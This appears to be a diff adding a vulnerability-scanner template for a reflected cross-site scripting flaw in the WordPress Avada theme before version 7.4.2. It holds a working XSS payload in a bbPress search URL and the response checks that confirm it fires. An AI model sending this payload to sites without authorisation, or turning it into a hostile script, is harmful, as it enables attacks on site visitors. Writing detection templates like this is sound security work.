@@ -1,0 +1,34 @@
+id: avada-xss
+brief:
+    title: WordPress Avada Website Builder <7.4.2 - Cross-Site Scripting
+    by: Akincibor
+    level: high
+    about: WordPress Avada Website Builder prior to 7.4.2 contains a cross-site scripting vulnerability. The theme does not properly escape bbPress searches before outputting them back as breadcrumbs.
+    label:
+        - xss
+        - wp
+        - wordpress
+        - wp-theme
+        - avada
+        - wpscan
+        - vuln
+    score: CVSS:7.2
+moves:
+    - verb: GET
+      to:
+        - '{{BaseURL}}/forums/search/z-->%22%3e%3C%2Fscript%3E%3Cscript%3Ealert%28document.domain%29%3C%2Fscript%3E/'
+      signs:
+        - "on": word
+          has:
+            - '"></script><script>alert(document.domain)</script>'
+            - avada-footer-scripts
+          in: body
+          need: all
+        - "on": word
+          has:
+            - text/html
+          in: header
+          need: all
+        - "on": status
+          status:
+            - 200
